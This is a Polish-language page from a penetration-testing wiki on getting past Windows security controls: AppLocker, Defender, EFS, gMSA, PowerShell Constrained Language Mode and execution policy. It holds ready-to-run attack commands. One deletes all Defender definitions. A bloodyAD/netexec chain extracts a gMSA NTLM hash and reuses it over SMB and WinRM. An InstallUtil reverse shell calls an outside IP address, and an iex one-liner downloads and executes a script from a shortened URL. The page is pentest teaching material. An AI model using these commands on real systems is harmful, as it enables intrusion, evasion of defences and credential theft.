# Kontrole zabezpieczeń Windows

{{#include ../../banners/hacktricks-training.md}}

## Polityka AppLocker

Lista dozwolonych aplikacji (application whitelist) to lista zatwierdzonych aplikacji lub plików wykonywalnych, które mogą być obecne i uruchamiane w systemie. Celem jest ochrona środowiska przed szkodliwym malware i niezatwierdzonym oprogramowaniem, które nie odpowiada specyficznym potrzebom biznesowym organizacji.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) jest rozwiązaniem Microsoftu dla **aplikacyjnego whitelistingu** i daje administratorom systemu kontrolę nad **tym, które aplikacje i pliki użytkownicy mogą uruchamiać**. Zapewnia **szczegółową kontrolę** nad plikami wykonywalnymi, skryptami, Windows installer files, DLLs, packaged apps oraz packed app installers.\ 
Często organizacje **blokują cmd.exe i PowerShell.exe** oraz dostęp zapisu do niektórych katalogów, **ale wszystko to można obejść**.

### Sprawdź

Sprawdź, które pliki/rozszerzenia są blacklisted/whitelisted:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Ta ścieżka rejestru zawiera konfiguracje i polityki stosowane przez AppLocker, umożliwiając przeglądanie bieżącego zestawu reguł egzekwowanych w systemie:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Useful **Writable folders** to bypass AppLocker Policy: Jeśli AppLocker pozwala na uruchamianie czegokolwiek w `C:\Windows\System32` lub `C:\Windows`, istnieją **writable folders**, których możesz użyć, aby to **bypass this**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Powszechnie **ufane** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaria mogą być również przydatne do obejścia AppLocker.
- **Słabo napisane reguły również można obejść**
- Na przykład, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, możesz utworzyć **folder o nazwie `allowed`** w dowolnym miejscu i będzie on dozwolony.
- Organizacje często koncentrują się na **blokowaniu pliku wykonywalnego `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, ale zapominają o **innych** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), takich jak `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` czy `PowerShell_ISE.exe`.
- **Egzekwowanie DLL jest bardzo rzadko włączane** z powodu dodatkowego obciążenia, jakie może to wywołać na systemie, oraz liczby testów wymaganych, aby upewnić się, że nic nie przestanie działać. Dlatego użycie **DLLs jako backdoors pomoże obejść AppLocker**.
- Możesz użyć [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) lub [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) do **wykonywania kodu PowerShell** w dowolnym procesie i obejścia AppLocker. Więcej informacji: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## Przechowywanie poświadczeń

### Security Accounts Manager (SAM)

Lokalne poświadczenia znajdują się w tym pliku, hasła są haszowane.

### Local Security Authority (LSA) - LSASS

**Poświadczenia** (zahashowane) są **zapisywane** w **pamięci** tego podsystemu z powodów Single Sign-On.\
**LSA** zarządza lokalną **polityką bezpieczeństwa** (polityka haseł, uprawnienia użytkowników...), **uwierzytelnianiem**, **tokenami dostępu**...\
To **LSA** będzie **sprawdzać** podane poświadczenia w pliku **SAM** (dla lokalnego logowania) i **komunikować się** z **kontrolerem domeny**, aby uwierzytelnić użytkownika domenowego.

**Poświadczenia** są **przechowywane** wewnątrz procesu **LSASS**: bilety Kerberos, hashe NT i LM, łatwo odszyfrowywane hasła.

### LSA secrets

LSA może zapisywać na dysku niektóre poświadczenia:

- Hasło konta komputera w Active Directory (gdy kontroler domeny jest niedostępny).
- Hasła kont usług Windows
- Hasła zadań zaplanowanych
- Inne (hasła aplikacji IIS...)

### NTDS.dit

To jest baza danych Active Directory. Obecna tylko na kontrolerach domeny.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) to antywirus dostępny w Windows 10 i Windows 11 oraz we wersjach Windows Server. **Blokuje** popularne narzędzia do pentestingu takie jak **`WinPEAS`**. Istnieją jednak sposoby, by **obejść te zabezpieczenia**.

### Check

Aby sprawdzić **status** **Defender**, możesz uruchomić cmdlet PS **`Get-MpComputerStatus`** (sprawdź wartość **`RealTimeProtectionEnabled`**, aby dowiedzieć się, czy jest aktywny):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Aby go wyenumerować, możesz również uruchomić:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Szyfrowany system plików (EFS)

EFS zabezpiecza pliki przez szyfrowanie, wykorzystując **klucz symetryczny** znany jako **File Encryption Key (FEK)**. Ten klucz jest zaszyfrowany za pomocą **klucza publicznego** użytkownika i przechowywany w $EFS **alternative data stream** zaszyfrowanego pliku. Gdy wymagana jest deszyfracja, odpowiedni **klucz prywatny** certyfikatu cyfrowego użytkownika jest używany do odszyfrowania FEK ze strumienia $EFS. Więcej informacji znajduje się [tutaj](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Scenariusze deszyfracji bez udziału użytkownika** obejmują:

- Gdy pliki lub foldery są przenoszone do systemu plików nieobsługującego EFS, takiego jak [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), są one automatycznie odszyfrowywane.
- Zaszyfrowane pliki wysyłane przez sieć za pomocą protokołu SMB/CIFS są odszyfrowywane przed transmisją.

Ta metoda szyfrowania umożliwia właścicielowi **transparentny dostęp** do zaszyfrowanych plików. Jednak samo zmienienie hasła właściciela i zalogowanie się nie umożliwi deszyfracji.

Najważniejsze wnioski:

- EFS używa symetrycznego FEK, zaszyfrowanego kluczem publicznym użytkownika.
- Do deszyfracji używany jest klucz prywatny użytkownika, by uzyskać dostęp do FEK.
- Automatyczna deszyfracja zachodzi w określonych warunkach, np. przy kopiowaniu na FAT32 lub przesyłaniu przez sieć.
- Zaszyfrowane pliki są dostępne dla właściciela bez dodatkowych kroków.

### Sprawdź informacje o EFS

Sprawdź, czy **użytkownik** korzystał z tej **usługi**, sprawdzając, czy istnieje ta ścieżka: `C:\users\<username>\appdata\roaming\Microsoft\Protect`

Sprawdź, **kto** ma **dostęp** do pliku używając cipher /c \<file\>  
Możesz też użyć `cipher /e` i `cipher /d` wewnątrz folderu, aby **zaszyfrować** i **odszyfrować** wszystkie pliki

### Odszyfrowywanie plików EFS

#### Uzyskanie uprawnień SYSTEM

Ta metoda wymaga, żeby **użytkownik-ofiara** miał na hoście uruchomiony **proces**. Jeśli tak jest, używając sesji `meterpreter` możesz zaimpersonować token procesu tego użytkownika (`impersonate_token` z `incognito`). Alternatywnie możesz po prostu `migrate` do procesu użytkownika.

#### Znając hasło użytkownika


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Grupowe konta usług zarządzanych (gMSA)

Microsoft opracował **Group Managed Service Accounts (gMSA)**, aby uprościć zarządzanie kontami usług w infrastrukturach IT. W przeciwieństwie do tradycyjnych kont usługowych, które często mają ustawienie "**Password never expire**", gMSA oferują bezpieczniejsze i łatwiejsze w zarządzaniu rozwiązanie:

- **Automatyczne zarządzanie hasłem**: gMSA używają złożonego, 240-znakowego hasła, które automatycznie zmienia się zgodnie z polityką domeny lub komputera. Proces ten jest obsługiwany przez Key Distribution Service (KDC) Microsoftu, eliminując potrzebę ręcznych aktualizacji haseł.
- **Zwiększone bezpieczeństwo**: Konta te są odporne na blokady i nie mogą być używane do interaktywnych logowań, co podnosi ich bezpieczeństwo.
- **Obsługa wielu hostów**: gMSA mogą być współdzielone na wielu hostach, co czyni je idealnymi dla usług działających na wielu serwerach.
- **Możliwość uruchamiania zadań zaplanowanych**: W przeciwieństwie do managed service accounts, gMSA obsługują uruchamianie scheduled tasks.
- **Uproszczone zarządzanie SPN**: System automatycznie aktualizuje Service Principal Name (SPN), gdy następują zmiany w szczegółach sAMaccount komputera lub jego nazwie DNS, upraszczając zarządzanie SPN.

Hasła dla gMSA są przechowywane we właściwości LDAP _**msDS-ManagedPassword**_ i są automatycznie resetowane co 30 dni przez Domain Controllers (DC). To hasło, zaszyfrowany blob danych znany jako [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), może zostać pobrane jedynie przez uprawnionych administratorów oraz serwery, na których gMSA są zainstalowane, co zapewnia bezpieczne środowisko. Aby uzyskać dostęp do tych informacji, wymagane jest zabezpieczone połączenie takie jak LDAPS, lub połączenie musi być uwierzytelnione z 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

To hasło można odczytać za pomocą [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Find more info in this post**](https://cube0x0.github.io/Relaying-for-gMSA/)

Also, check this [web page](https://cube0x0.github.io/Relaying-for-gMSA/) about how to perform a **NTLM relay attack** to **read** the **password** of **gMSA**.

### Wykorzystywanie łańcuchowania ACL do odczytu zarządzanego hasła gMSA (GenericAll -> ReadGMSAPassword)

W wielu środowiskach użytkownicy o niskich uprawnieniach mogą pivotować do sekretów gMSA bez kompromitacji DC, wykorzystując błędnie skonfigurowane ACL obiektów:

- Grupa, którą możesz kontrolować (np. poprzez GenericAll/GenericWrite), ma przyznane `ReadGMSAPassword` względem gMSA.
- Dodając siebie do tej grupy, odziedziczasz prawo do odczytu blobu `msDS-ManagedPassword` gMSA przez LDAP i uzyskania użytecznych poświadczeń NTLM.

Typowy przebieg:

1) Odkryj ścieżkę za pomocą BloodHound i oznacz swoje foothold principals jako Owned. Szukaj krawędzi takich jak:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Dodaj siebie do pośredniej grupy, którą kontrolujesz (przykład z bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Odczytaj zarządzane hasło gMSA przez LDAP i uzyskaj hash NTLM. NetExec automatyzuje ekstrakcję `msDS-ManagedPassword` i konwersję na NTLM:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) Uwierzytelnij się jako gMSA, używając NTLM hash (no plaintext needed). Jeśli konto znajduje się w Remote Management Users, WinRM będzie działać bezpośrednio:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Notatki:
- LDAP reads of `msDS-ManagedPassword` require sealing (e.g., LDAPS/sign+seal). Tools handle this automatically.
- gMSAs są często przydzielane lokalne uprawnienia, takie jak WinRM; sprawdź członkostwo w grupie (np. Remote Management Users), aby zaplanować lateral movement.
- Jeśli potrzebujesz tylko blobu, aby samodzielnie obliczyć NTLM, zobacz strukturę MSDS-MANAGEDPASSWORD_BLOB.



## LAPS

The **Local Administrator Password Solution (LAPS)**, available for download from [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), umożliwia zarządzanie hasłami lokalnego konta Administrator. Te hasła, które są **losowe**, unikatowe i **regularnie zmieniane**, są przechowywane centralnie w Active Directory. Dostęp do tych haseł jest ograniczony przez ACLs do uprawnionych użytkowników. Przy przydzieleniu wystarczających uprawnień możliwy jest odczyt lokalnych haseł administratora.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **ogranicza wiele funkcji** potrzebnych do efektywnego korzystania z PowerShell, takich jak blokowanie obiektów COM, zezwalanie tylko na zatwierdzone typy .NET, workflow oparte na XAML, klasy PowerShell i inne.

### **Sprawdź**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Omijanie
```bash
#Easy bypass
Powershell -version 2
```
W aktualnych wersjach Windows to obejście nie będzie działać, ale możesz użyć[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Aby to skompilować, może być konieczne** **to** _**Dodanie odwołania**_ -> _Przeglądaj_ -> _Przeglądaj_ -> dodaj `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` oraz **zmień projekt na .Net4.5**.

#### Direct bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Możesz użyć [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) lub [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) aby **execute Powershell** code w dowolnym procesie i obejść constrained mode. Więcej informacji: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## PS Execution Policy

Domyślnie jest ustawiona na **restricted.** Główne sposoby obejścia tej polityki:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Interfejs Security Support Provider (SSPI)

Jest to API, które można wykorzystać do uwierzytelniania użytkowników.

SSPI odpowiada za znalezienie odpowiedniego protokołu dla dwóch maszyn, które chcą się komunikować. Preferowaną metodą jest Kerberos. Następnie SSPI negocjuje, który protokół uwierzytelniania zostanie użyty — te protokoły uwierzytelniania nazywane są Security Support Provider (SSP), znajdują się na każdej maszynie Windows w postaci DLL i obie maszyny muszą obsługiwać ten sam SSP, aby mogły się komunikować.

### Główne SSP

- **Kerberos**: Preferowany
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** i **NTLMv2**: Ze względów zgodności
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Serwery WWW i LDAP, hasło w postaci skrótu MD5
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL i TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Służy do negocjacji protokołu do użycia (Kerberos lub NTLM, domyślnie Kerberos)
- %windir%\Windows\System32\lsasrv.dll

#### Negocjacja może zaoferować kilka metod lub tylko jedną.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) to funkcja, która umożliwia **wyświetlanie monitów o zgodę dla działań wymagających podniesionych uprawnień**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)

{{#include ../../banners/hacktricks-training.md}}
